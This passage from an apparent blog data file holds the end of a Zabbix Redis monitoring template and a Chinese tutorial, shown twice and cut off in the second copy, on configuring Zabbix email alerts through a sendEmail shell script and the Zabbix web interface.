class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt;</span><br><span class=\"line\">            &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt;</span><br><span class=\"line\">            &lt;graph_items&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;0&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;C80000&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Templates Redis_6379&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;redis_stats[6379,last_save_time]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">            &lt;/graph_items&gt;</span><br><span class=\"line\">        &lt;/graph&gt;</span><br><span class=\"line\">        &lt;graph&gt;</span><br><span class=\"line\">            &lt;name&gt;Redis Port Connections_6379&lt;/name&gt;</span><br><span class=\"line\">            &lt;width&gt;900&lt;/width&gt;</span><br><span class=\"line\">            &lt;height&gt;200&lt;/height&gt;</span><br><span class=\"line\">            &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt;</span><br><span class=\"line\">            &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt;</span><br><span class=\"line\">            &lt;show_work_period&gt;1&lt;/show_work_period&gt;</span><br><span class=\"line\">            &lt;show_triggers&gt;0&lt;/show_triggers&gt;</span><br><span class=\"line\">            &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">            &lt;show_legend&gt;1&lt;/show_legend&gt;</span><br><span class=\"line\">            &lt;show_3d&gt;0&lt;/show_3d&gt;</span><br><span class=\"line\">            &lt;percent_left&gt;0.0000&lt;/percent_left&gt;</span><br><span class=\"line\">            &lt;percent_right&gt;0.0000&lt;/percent_right&gt;</span><br><span class=\"line\">            &lt;ymin_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymin_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymax_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymax_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt;</span><br><span class=\"line\">            &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt;</span><br><span class=\"line\">            &lt;graph_items&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;0&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;EE0000&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;4&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Templates Redis_6379&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;redis_stats[6379,blocked_clients]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;1&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;BBBB00&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;4&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Templates Redis_6379&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;redis_stats[6379,total_connections_received]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;2&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;CC00CC&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;4&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Templates Redis_6379&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;redis_stats[6379,total_commands_processed]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;3&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;00CCCC&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;4&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Templates Redis_6379&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;redis_stats[6379,connected_slave]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;4&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;009900&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;4&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Templates Redis_6379&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;redis_stats[6379,connected_clients]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">            &lt;/graph_items&gt;</span><br><span class=\"line\">        &lt;/graph&gt;</span><br><span class=\"line\">        &lt;graph&gt;</span><br><span class=\"line\">            &lt;name&gt;Redis Port status_6379&lt;/name&gt;</span><br><span class=\"line\">            &lt;width&gt;900&lt;/width&gt;</span><br><span class=\"line\">            &lt;height&gt;200&lt;/height&gt;</span><br><span class=\"line\">            &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt;</span><br><span class=\"line\">            &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt;</span><br><span class=\"line\">            &lt;show_work_period&gt;1&lt;/show_work_period&gt;</span><br><span class=\"line\">            &lt;show_triggers&gt;1&lt;/show_triggers&gt;</span><br><span class=\"line\">            &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">            &lt;show_legend&gt;1&lt;/show_legend&gt;</span><br><span class=\"line\">            &lt;show_3d&gt;0&lt;/show_3d&gt;</span><br><span class=\"line\">            &lt;percent_left&gt;0.0000&lt;/percent_left&gt;</span><br><span class=\"line\">            &lt;percent_right&gt;0.0000&lt;/percent_right&gt;</span><br><span class=\"line\">            &lt;ymin_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymin_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymax_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymax_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt;</span><br><span class=\"line\">            &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt;</span><br><span class=\"line\">            &lt;graph_items&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;0&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;C80000&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Templates Redis_6379&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;net.tcp.listen[6379]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">            &lt;/graph_items&gt;</span><br><span class=\"line\">        &lt;/graph&gt;</span><br><span class=\"line\">        &lt;graph&gt;</span><br><span class=\"line\">            &lt;name&gt;Redis Uptime_<span class=\"keyword\">in</span>_seconds_6379&lt;/name&gt;</span><br><span class=\"line\">            &lt;width&gt;900&lt;/width&gt;</span><br><span class=\"line\">            &lt;height&gt;200&lt;/height&gt;</span><br><span class=\"line\">            &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt;</span><br><span class=\"line\">            &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt;</span><br><span class=\"line\">            &lt;show_work_period&gt;1&lt;/show_work_period&gt;</span><br><span class=\"line\">            &lt;show_triggers&gt;1&lt;/show_triggers&gt;</span><br><span class=\"line\">            &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">            &lt;show_legend&gt;1&lt;/show_legend&gt;</span><br><span class=\"line\">            &lt;show_3d&gt;0&lt;/show_3d&gt;</span><br><span class=\"line\">            &lt;percent_left&gt;0.0000&lt;/percent_left&gt;</span><br><span class=\"line\">            &lt;percent_right&gt;0.0000&lt;/percent_right&gt;</span><br><span class=\"line\">            &lt;ymin_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymin_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymax_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymax_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt;</span><br><span class=\"line\">            &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt;</span><br><span class=\"line\">            &lt;graph_items&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;0&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;C80000&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Templates Redis_6379&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;redis_stats[6379,uptime_<span class=\"keyword\">in</span>_seconds]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">            &lt;/graph_items&gt;</span><br><span class=\"line\">        &lt;/graph&gt;</span><br><span class=\"line\">        &lt;graph&gt;</span><br><span class=\"line\">            &lt;name&gt;Redis Used memory_6379&lt;/name&gt;</span><br><span class=\"line\">            &lt;width&gt;900&lt;/width&gt;</span><br><span class=\"line\">            &lt;height&gt;200&lt;/height&gt;</span><br><span class=\"line\">            &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt;</span><br><span class=\"line\">            &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt;</span><br><span class=\"line\">            &lt;show_work_period&gt;1&lt;/show_work_period&gt;</span><br><span class=\"line\">            &lt;show_triggers&gt;1&lt;/show_triggers&gt;</span><br><span class=\"line\">            &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">            &lt;show_legend&gt;1&lt;/show_legend&gt;</span><br><span class=\"line\">            &lt;show_3d&gt;0&lt;/show_3d&gt;</span><br><span class=\"line\">            &lt;percent_left&gt;0.0000&lt;/percent_left&gt;</span><br><span class=\"line\">            &lt;percent_right&gt;0.0000&lt;/percent_right&gt;</span><br><span class=\"line\">            &lt;ymin_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymin_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymax_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymax_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt;</span><br><span class=\"line\">            &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt;</span><br><span class=\"line\">            &lt;graph_items&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;0&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;C80000&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Templates Redis_6379&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;redis_stats[6379,used_memory:]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;1&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;00C8C8&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Templates Redis_6379&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;redis_stats[6379,used_memory_rss]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">            &lt;/graph_items&gt;</span><br><span class=\"line\">        &lt;/graph&gt;</span><br><span class=\"line\">    &lt;/graphs&gt;</span><br><span class=\"line\">&lt;/zabbix_<span class=\"built_in\">export</span>&gt;</span><br></pre></td></tr></table></figure>"},{"title":"zabbix邮件报警","date":"2016-11-01T10:53:00.000Z","_content":"\n### 示警媒介\n一般情况下，zabbix监控主机都配置了触发器，触发器被触发发送消息给运维，需要中间介质来接收并传递消息。\n\nzabbix默认的【示警媒介类型】有三种，Email、Jabber、SMS。\n（1）Email：使用sendmail发送邮件，从这边出去的邮件基本是垃圾邮件。\n（2）SMS：需要短信设备，没有，所以没用过这东西\n（3）Jabber:Jabber有第三方插件，能让Jabber用户和MSN、YahooMessager、ICQ等IM用户相互通讯。因为Google遵从Jabber协议，并且Google已经将Gtalk的服务器开放给了其它的Jabber服务器。所以PSI、Giam等Jabber客户端软件支持GTalk用户登陆。国内没啥人用。\n\nsendEmail是一个轻量级，命令行的SMTP邮件客户端。如果需要使用命令行发送邮件，那么sendEmail是不错的选择。sendEmail使用简单并且功能强大。这个被设计用在php、perl和web站点使用。**请注意，不是sendmail。**\n\n---\n\n### sendEmail安装\n```bash\n# 下载软件\nwget http://caspian.dotconf.net/menu/Software/SendEmail/sendEmail-v1.56.tar.gz\n# 解压软件\n# tar zxvf sendEmail-v1.56.tar.gz\n# 进入目录\ncd /usr/src/sendEmail-v1.56\n# 创建目录\nmkdir /usr/local/bin\n# 复制文件，并设置权限\ncp -a sendEmail /usr/local/bin\nchmod +x /usr/local/bin/sendEmail\n# 安装组件\nyum install perl-Net-SSLeay perl-IO-Socket-SSL -y\n```\n\n<!-- more -->\n\n---\n\n### zabbix server端配置\n进入zabbix自定义的指定目录\n可以查看zabbix_server.conf配置文件AlertScriptsPath变量是如何定义的。\n\n进入相关目录\ncd /usr/lib/zabbix/alertscripts\n\n新建sendEmail.sh脚本，内容如下\n```bash\n#!/bin/bash\n\nto=$1\nsubject=$2\nbody=$3\n/usr/local/bin/sendEmail  -f a@domain.com -t \"$to\" -s smtp.exmail.qq.com -u \"$subject\" -o message-content-type=html -o message-charset=utf8 -xu a@domain.com -xp password -m \"$body\"\n```\n\n> a@domain.com 表示发件人邮箱\nsmtp.exmail.qq.com 表示邮箱的smtp服务器，这里用的是腾讯邮箱。\npassword 表示发件人邮箱密码\n\n编辑完成后，给脚本权限\n```bash\nchmod +x sendEmail.sh\nchown zabbix.zabbix sendEmail.sh\n```\n手动执行一次脚本，后面的参数分别对应接收人，主题，内容\n```bash\n./sendEmail.sh c@domain.com test 123\n```\n登录c@domain.com的账户，查看邮件是否可以收到\n如果脚本执行没有报错，收不到邮件的话，请检查linux网络问题,iptables、selinux是否关闭。\n\n---\n\n### zabbix web端配置\n进入zabbix管理页面\n点击管理->报警媒介类型 点击最右边的创建媒体类型\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/1.png)\n输入脚本名称，类型选择脚本\n添加以下3个参数，分别对应sendEmail.sh脚本需要的3个参数：收件人地址、主题、详细内容\n{ALERT.SENDTO}\n{ALERT.SUBJECT}\n{ALERT.MESSAGE}\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/2.png)\n解释:很多人安装zabbix 3.0之后，写的脚本一直发信不成功,手动执行时可以的。\n那是因为zabbix3.0之后，可以自定义参数了。所以不写参数，它是不会传参数的。\n在2.x版本不存在这个问题，默认会传3个参数。\n\n点击Admin用户\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/3.png)\n点击添加\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/4.png)\n选择sendEmail.sh脚本，输入收件人的邮箱地址\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/5.png)\n点击用户群组，点击zabbix administrator后面的调用模式，点击一下，就启用了\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/6.png)\n点权限->添加\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/7.png)\n\n选择所有\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/8.png)\n点击更新\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/9.png)\n点击配置->动作 点击默认的动作\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/10.png)\n点击操作->编辑\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/11.png)\n修改持续时间为60秒\n修改步骤为3,表示触发3次动作\n选择用户Admin\n选择仅送到sendEmail.sh\n点击更新\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/12.png)\n点击更新\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/13.png)\n解释:默认的步骤是1-1,也即是从1开始到1结束。一旦故障发生，就是执行sendEmail.sh脚本发生报警邮件给Admin用户和zabbix administrator组。\n假如故障持续了1个小时，它也只发送一次。如果改成1-0，0是表示不限制.无限发送\n间隔就是默认持续时间60秒。那么一个小时，就会发送60封邮件。\n如果需要短信报警的话,可以再创建一条新的动作，选择短信脚本。\n\n---\n\n### 邮件测试及模板修改\n\n下面开始测试邮件报警\n先添加一台主机test，不存在的IP地址\n等待几分钟，可以看到是红色状态\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/14.png)\n等待几分钟，就会收到邮件报警了\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/15.png)\n点击报表->动作日志 可以看到触发动作的次数。只会有3次，除非test主机状态改变，也就是正常的时候，会触发一次,否则不会再触发。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/16.png)\n大家可以看到邮件里面内容都堆到一起了，没有换行，且是英文，可以自行修改【组态-动作-动作】里的配置。\n\n下面是我修改后的配置信息:\n```bash\n====================================================\n\n# 默认接收人:\n\n故障{TRIGGER.STATUS}，服务器【{HOST.NAME1}】发生【 {TRIGGER.NAME}】故障！\n\n====================================================\n\n# 默认信息:\n\n告警主机:{HOST.NAME1}<br/>\n\n告警时间:{EVENT.DATE} {EVENT.TIME}<br/>\n\n告警等级:{TRIGGER.SEVERITY}<br/>\n\n告警信息: {TRIGGER.NAME}<br/>\n\n告警项目:{TRIGGER.KEY1}<br/>\n\n问题详情:{ITEM.NAME}:{ITEM.VALUE}<br/>\n\n当前状态:{TRIGGER.STATUS}:{ITEM.VALUE1}<br/>\n\n事件ID:{EVENT.ID}<br/>\n\n====================================================\n\n# 恢复主旨:\n\n恢复{TRIGGER.STATUS}，服务器【{HOST.NAME1}】故障【 {TRIGGER.NAME}】已恢复！\n\n====================================================\n\n# 恢复信息:\n\n告警主机:{HOST.NAME1}<br/>\n\n告警时间:{EVENT.DATE} {EVENT.TIME}<br/>\n\n告警等级:{TRIGGER.SEVERITY}<br/>\n\n告警信息: {TRIGGER.NAME}<br/>\n\n告警项目:{TRIGGER.KEY1}<br/>\n\n问题详情:{ITEM.NAME}:{ITEM.VALUE}<br/>\n\n当前状态:{TRIGGER.STATUS}:{ITEM.VALUE1}<br/>\n\n事件ID:{EVENT.ID}<br/>\n```\n\n更改后，收到的邮件样式如下：\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/17.png)\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/18.png)\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/19.png)","source":"_posts/zabbix邮件报警.md","raw":"---\ntitle: zabbix邮件报警\ncategories:\n  - 运维部署\ndate: 2016-11-1 18:53:00\n---\n\n### 示警媒介\n一般情况下，zabbix监控主机都配置了触发器，触发器被触发发送消息给运维，需要中间介质来接收并传递消息。\n\nzabbix默认的【示警媒介类型】有三种，Email、Jabber、SMS。\n（1）Email：使用sendmail发送邮件，从这边出去的邮件基本是垃圾邮件。\n（2）SMS：需要短信设备，没有，所以没用过这东西\n（3）Jabber:Jabber有第三方插件，能让Jabber用户和MSN、YahooMessager、ICQ等IM用户相互通讯。因为Google遵从Jabber协议，并且Google已经将Gtalk的服务器开放给了其它的Jabber服务器。所以PSI、Giam等Jabber客户端软件支持GTalk用户登陆。国内没啥人用。\n\nsendEmail是一个轻量级，命令行的SMTP邮件客户端。如果需要使用命令行发送邮件，那么sendEmail是不错的选择。sendEmail使用简单并且功能强大。这个被设计用在php、perl和web站点使用。**请注意，不是sendmail。**\n\n---\n\n### sendEmail安装\n```bash\n# 下载软件\nwget http://caspian.dotconf.net/menu/Software/SendEmail/sendEmail-v1.56.tar.gz\n# 解压软件\n# tar zxvf sendEmail-v1.56.tar.gz\n# 进入目录\ncd /usr/src/sendEmail-v1.56\n# 创建目录\nmkdir /usr/local/bin\n# 复制文件，并设置权限\ncp -a sendEmail /usr/local/bin\nchmod +x /usr/local/bin/sendEmail\n# 安装组件\nyum install perl-Net-SSLeay perl-IO-Socket-SSL -y\n```\n\n<!-- more -->\n\n---\n\n### zabbix server端配置\n进入zabbix自定义的指定目录\n可以查看zabbix_server.conf配置文件AlertScriptsPath变量是如何定义的。\n\n进入相关目录\ncd /usr/lib/zabbix/alertscripts\n\n新建sendEmail.sh脚本，内容如下\n```bash\n#!/bin/bash\n\nto=$1\nsubject=$2\nbody=$3\n/usr/local/bin/sendEmail  -f a@domain.com -t \"$to\" -s smtp.exmail.qq.com -u \"$subject\" -o message-content-type=html -o message-charset=utf8 -xu a@domain.com -xp password -m \"$body\"\n```\n\n> a@domain.com 表示发件人邮箱\nsmtp.exmail.qq.com 表示邮箱的smtp服务器，这里用的是腾讯邮箱。\npassword 表示发件人邮箱密码\n\n编辑完成后，给脚本权限\n```bash\nchmod +x sendEmail.sh\nchown zabbix.zabbix sendEmail.sh\n```\n手动执行一次脚本，后面的参数分别对应接收人，主题，内容\n```bash\n./sendEmail.sh c@domain.com test 123\n```\n登录c@domain.com的账户，查看邮件是否可以收到\n如果脚本执行没有报错，收不到邮件的话，请检查linux网络问题,iptables、selinux是否关闭。\n\n---\n\n### zabbix web端配置\n进入zabbix管理页面\n点击管理->报警媒介类型 点击最右边的创建媒体类型\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/1.png)\n输入脚本名称，类型选择脚本\n添加以下3个参数，分别对应sendEmail.sh脚本需要的3个参数：收件人地址、主题、详细内容\n{ALERT.SENDTO}\n{ALERT.SUBJECT}\n{ALERT.MESSAGE}\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/2.png)\n解释:很多人安装zabbix 3.0之后，写的脚本一直发信不成功,手动执行时可以的。\n那是因为zabbix3.0之后，可以自定义参数了。所以不写参数，它是不会传参数的。\n在2.x版本不存在这个问题，默认会传3个参数。\n\n点击Admin用户\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/3.png)\n点击添加\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/4.png)\n选择sendEmail.sh脚本，输入收件人的邮箱地址\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/5.png)\n点击用户群组，点击zabbix administrator后面的调用模式，点击一下，就启用了\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/6.png)\n点权限->添加\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/7.png)\n\n选择所有\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/8.png)\n点击更新\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/9.png)\n点击配置->动作 